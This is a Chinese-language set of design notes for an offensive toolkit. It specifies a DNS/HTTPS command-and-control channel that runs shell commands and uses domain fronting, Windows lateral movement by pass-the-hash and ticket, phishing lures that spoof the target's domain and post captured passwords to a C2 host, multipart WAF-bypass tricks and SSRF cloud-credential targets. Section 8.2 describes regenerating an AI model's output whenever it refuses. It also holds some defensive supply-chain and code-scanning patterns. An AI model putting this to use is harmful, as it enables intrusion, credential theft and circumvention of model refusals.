# APT / C2 / Anti-Hallucination / Proxy / Supply-Chain — 从 bingo v7.0.66 移植 (core/apt/* + zero_hal_v5 + zeroday + proxy_rotator + amplifier + whitebox_analyzer + supply_chain + phishing + lateral_movement + c2_channel)

## 1. C2 信道设计 (c2_channel.py)

### 1.1 DNS 隧道协议
```
数据编码: base32 去padding转小写
分包: 每 40 字节一个 label (≈32字节实际数据)
上行:  <b32chunk>.<idx>.<session_id>.C2_DOMAIN   (A记录, getaddrinfo 裸查询, 零依赖)
下行:  cmd.<session_id>.C2_DOMAIN               (TXT记录)
命令:  "RUN:<shell cmd>" / "NOP"
握手:  "CHECKIN|<hostname>|<whoami>"
session_id: base32(os.urandom(6)) — 48bit
服务端 padding 恢复: pad = encoded.upper() + "=" * ((-len(encoded)) % 8)
```

### 1.2 HTTPS beacon
```
POST /api/v1/check  {"d": b64(AES-256-CBC(json))}   iv(16B)前置
防探测头: X-Request-ID: b64(os.urandom(8))
加密库缺失 → XOR keystream 回退 (key 循环重复)
Domain Fronting: TLS SNI=CDN域名, HTTP Host=真实C2
```

### 1.3 Jitter 公式 (可搬)
```python
jitter_sec = INTERVAL * (JITTER / 100)
sleep_time = INTERVAL + random.uniform(-jitter_sec, jitter_sec)
time.sleep(max(1, sleep_time))
```

## 2. 横向移动 (lateral_movement.py)

```
端口→OS判定: 445/3389→windows, 22→linux
DC判定: 88/389 开放
快速扫描端口: [21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,636,1433,3306,3389,5432,5985,5986,8080,8443,9200]
攻击矩阵: SMB(psexec/smbexec) + WMI + WinRM(5985/5986) + DCOM(dcomexec)
          + 计划任务(atexec) + SSH ProxyJump + PTH + PTT + BloodHound + secretsdump + cme spray
PTH: impacket -hashes LM:NT / evil-winrm -H / xfreerdp /pth / mimikatz sekurlsa::pth
PTT: KRB5CCNAME env + impacket -k -no-pass + Rubeus
```

## 3. 钓鱼 (phishing.py)

### 3.1 5 个 lure 模板
```
security_alert: [URGENT] Security Alert — Account Compromise Detected / IT Security Team
hr_policy:      Important: Updated HR Policy — Action Required / Human Resources
invoice:        Invoice #{invoice_num} — Payment Confirmation Required / Accounts Payable
it_upgrade:     Action Required: Microsoft 365 Account Upgrade / IT Helpdesk
ceo_fraud:      Confidential — Urgent Request / CEO Office
```

### 3.2 关键技巧
```
发件人伪装: "{sender_name} <{lower_dotted}@{target_domain}>" — 用目标自身域名绕过 SPF 归属判断
token: md5(target_email)[:16] → URL: https://c2/login?token=<t>
tracking pixel 双通道: 邮件 <img src=c2/track/<token>.gif> + 钓鱼页 new Image()
提交: fetch(collect, POST JSON {u,p}) → setTimeout(redirect, 800)
```

## 4. 供应链 (supply_chain.py)

### 4.1 恶意包 IOC
```
npm:  event-stream flatmap-stream ua-parser-js coa rc colors faker node-ipc xz-utils polyfill.io
pypi: ctx drgn python-nmap loguru-sink colourama requesst importantt
```

### 4.2 typosquat 热门包表 (Levenshtein ≤2)
```
pypi: requests numpy pandas flask django sqlalchemy boto3 pydantic fastapi urllib3 cryptography paramiko pillow matplotlib scipy
npm:  lodash express react axios webpack moment chalk commander dotenv typescript eslint prettier babel jest next
```

### 4.3 Dependency Confusion
```
内包名 → 查公开 registry (pypi.org/pypi/{name}/json + registry.npmjs.org/{name})
200 → CRITICAL (内部名在公开源存在 = 可混淆投毒)
404 → 不存在 | 超时 → MEDIUM
```

### 4.4 GitHub Actions 7 条风险正则
```
uses: xxx@(?!40位sha) → 未 pin SHA (MEDIUM)
${{ github.event.* }} → 不可信输入 (HIGH)
run: ${{ }} → run 步骤不可信数据 (HIGH)
curl | bash|sh|python → CI 管道执行 (HIGH)
npm install --unsafe-perm → MEDIUM
pip install --pre → LOW
secrets.GITHUB_TOKEN + write → MEDIUM
```

## 5. Zero HAL v5 — 反幻觉引擎 (zero_hal_v5.py) ★与 hunter EventKernel 互补

### 5.1 5 层架构
```
L1 FactRegistry: 从执行输出提取事实 (IP/端口/状态码/版本/头/路径/cookie/域名/CVE), 去重+过滤本地IP
   IP过滤: 私有段 ^(127\.|10\.|192\.168\.|172\.1[6-9]\.|172\.2\d\.|172\.3[01]\.)
   evidence_hash = sha256(cat:value:source)[:12]
L2 ClaimAnchorValidator: 漏洞声称无证据锚点 → UNANCHORED_CLAIM (blocked)
   证据锚点特征: \[\d{3}/\d+B\] | STATUS:\d{3} | HTTP/1.\d \d{3} | curl -s | r\.status_code | evidence_hash
L3 NumericHallucinationGuard: 端口/IP/状态码/版本必须命中 Registry, 否则 NUMERIC_HAL (blocked)
L4 InferenceMeter: 推理词计数 / 证据词计数, ratio>35% 警告, >60% EXCESS_INFERENCE 拦截
   推理词: EN: probably/likely/maybe/might/could/possibly/seems/assuming
           KO: 아마/추정/추측/보통은 | ZH: 可能/也许/大概/推测/通常/看起来/应该
L5 ContextPoisonGuard: 跨会话污染 — 前目标域名泄露 + 跨会话引用词 ("from previous session"/"上次会话"/"之前找到")
```

### 5.2 短路返回
```
L2 失败即 return，不继续 L3-L5; blocked 携带 inject_message (含"先 curl 再声明"指令)
```

## 6. 0day 狩猎 (zeroday.py)

### 6.1 本地 CVE DB (无网可用)
```
Apache HTTPD 2.4.49→CVE-2021-41773, 2.4.50→CVE-2021-42013
Log4j 2.14→CVE-2021-44228, 2.15→CVE-2021-45046, 2.16→CVE-2021-44832
Confluence 7.13→CVE-2022-26134 | Spring Boot 2.6→CVE-2022-22965
OpenSSL 1.0.1→CVE-2014-0160, 3.0.0-3.0.6→CVE-2022-3602
GitLab 11.9-12.0→CVE-2021-22205 | Grafana 8.0-8.3→CVE-2021-43798
WebLogic 12.1/12.2/14.1→CVE-2020-14882 | Jira 8.13-8.20→CVE-2022-0540
Mitel MiCollab 9.8/9.7→CVE-2024-35286,41713 | MediaTek MT76xx→CVE-2024-20017
libwebp 0.5-1.3.1→CVE-2023-4863 | glibc 2.34-2.38→CVE-2023-4911 | RAGFlow 0.6/0.7→CVE-2024-43035
```

### 6.2 错误信号 (带 exploit class)
```
(r"uid=\d+\(root\)", "rce_root", "rce_critical")
(r"\$\{jndi:", "jndi_payload", "log4shell")
(r"(127\.0\.0\.1|169\.254\.169\.254)", "internal_ip", "ssrf")
(r"\.git/HEAD", "git_exposure", "source_leak")
(r"password\s*=\s*['\"][^'\"]{4,}", "hardcoded_pw", "credential_leak")
(r"GLIBC_TUNABLES.*overflow|Looney Tunables", "glibc_tunables_lpe", "lpe_critical")
(r"pickle\.loads.*untrusted|__reduce__.*RCE", "pickle_rce", "rce")
```

## 7. 代理轮换 (proxy_rotator.py)

```
_POOL_MIN=5 _POOL_MAX=50 _BLACKLIST_TTL=1800(30min) _MAX_FAIL=3 _REFILL_SLEEP=30
三振出局: fail_count≥3 → 黑名单(TTL记录时间); 否则放回队尾给第二次机会
env 注入: 大写+小写 HTTP_PROXY/HTTPS_PROXY 四键全注入
换代理后重置 WAF 基线 (与 hunter Broker 状态机同理念)
代理验证 3 阶段: TCP连接(5s) → httpbin.org/ip 匿名性(响应含我IP→淘汰, latency>3s→淘汰)
                → 目标 /robots.txt HEAD (403→淘汰)
评分: score = latency / 3.0
```

## 8. Intelligence Amplifier (amplifier.py)

### 8.1 技术栈→攻击映射 (14条)
```
php:  LFI RFI "PHP filter" phpinfo eval webshell file_get_contents
wordpress: wp-admin xmlrpc wp-login brute plugin RCE timthumb
apache: mod_status CVE-2021-41773 path traversal WebDAV
nginx: alias traversal merge_slashes SSRF via Nginx
mysql: UNION SELECT INTO OUTFILE LOAD_FILE information_schema
mssql: xp_cmdshell EXEC master.dbo linked servers SA account
spring: CVE-2022-22965 SpEL injection Actuator endpoints SSTI
log4j: CVE-2021-44228 JNDI ldap ${jndi:ldap:// log4shell
jenkins: script console Groovy RCE CVE-2024-23897 build args
docker: socket exposure privileged container escape overlay
kubernetes: RBAC service account etcd kubelet API admission
aws: IMDSv1 s3 bucket lambda env cognito iam role
iis: PUT method WebDAV ASP upload NTLM relay Tilde enum
struts: OGNL injection CVE-2017-5638 CVE-2023-50164
```

### 8.2 自修正循环
```
质量评分: refusal检测(cannot assist|I'm unable|无法协助|도움을 드릴 수 없→0分)
         短回答-0.4 | 无命令-0.2 | 无步骤-0.2 | 无代码块-0.1
score<0.45 → 重生成, 最多2次
```

## 9. 白盒分析模式 (whitebox_analyzer.py)

```python
SQLi: (r'(?i)(SELECT|INSERT|UPDATE|DELETE|WHERE).*?\$_(GET|POST|REQUEST|COOKIE)\s*\[', high)
      (r'(?i)execute\s*\(.*?f["\'].*?\{', high)   # Python f-string in SQL
      (r'(?i)\.query\s*\([^)]*\+\s*req\.(query|params|body)', high)  # Node
XSS:  (r'innerHTML\s*=.*?(location|search|hash|document\.URL)', high)
      (r'dangerouslySetInnerHTML', high)  # React
SSRF: (r'(?i)(urllib|requests|curl|fetch|http\.get)\s*[\.(].{0,30}(\$_GET|\$_POST|req\.(query|body|params))', high)
AUTH: (r'(?i)(password|passwd|pwd)\s*==\s*["\']', high)
      (r'(?i)(admin|root|test|debug)\s*:\s*(admin|root|test|1234|password)', high)
RCE:  (r'(?i)(system|exec|passthru|shell_exec|popen)\s*\(\s*\$_(GET|POST|REQUEST)', high)
      (r'(?i)(subprocess|os\.system|os\.popen)\s*\(.*?request\.(args|form|data)', high)
上下文提取: match ±200字符内抓 endpoint (["'](/[\w/\-]+)["']) + param
```

## 10. React2Shell WAF 绕过 5 技术 (react2shell_waf_bypass.py)

```
BP1 duplicate boundary: WAF用boundary=x(忽略body), busboy用boundary=y(正常解析)
BP2 非UTF8字节: Content-Type: multipart/form-data; boundary="y"; a="b<0x88>" → WAF解析器失败fail-open
BP3 字段级 UTF-16LE: 字段内 Content-Type: text/plain; charset=utf16le → WAF看原始字节, busboy解码后见payload
BP4 重复字段Content-Type: 第一个utf16le(生效) + 第二个utf8(WAF看到)
BP5 boundary结束符尾随空格: --y-- <SPACE> → WAF认为表单结束, busboy认为垃圾继续解析
```

## 11. SSRF 链 17 目标

```
AWS:   http://169.254.169.254/latest/meta-data/  .../iam/security-credentials/  .../latest/user-data
GCP:   http://metadata.google.internal/computeMetadata/v1/  .../instance/service-accounts/default/token  (Metadata-Flavor: Google)
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata: true)
       .../metadata/identity/oauth2/token?api-version=2018-02-01&resource=...
内网:  127.0.0.1:80/8080/8443 redis:6379 memcached:11211 elasticsearch:9200/_cat/indices
文件:  file:///etc/passwd /etc/shadow /etc/hosts wp-config.php
判定:  200 + size>10
```

## 12. 实战要点

- 反幻觉: 任何数字声明必须锚定执行输出 (evidence_hash 12位)
- C2 客户端零依赖 (getaddrinfo 裸 DNS) — 目标机无 python 库也能跑
- 钓鱼发件人用目标自身域名伪装 — 比伪造域名有效
- 代理轮换三振出局 + 30min TTL — 防 IP 封禁的黄金参数
- React2Shell 的 5 个 multipart 解析器分歧点 — WAF 厂商普遍没修
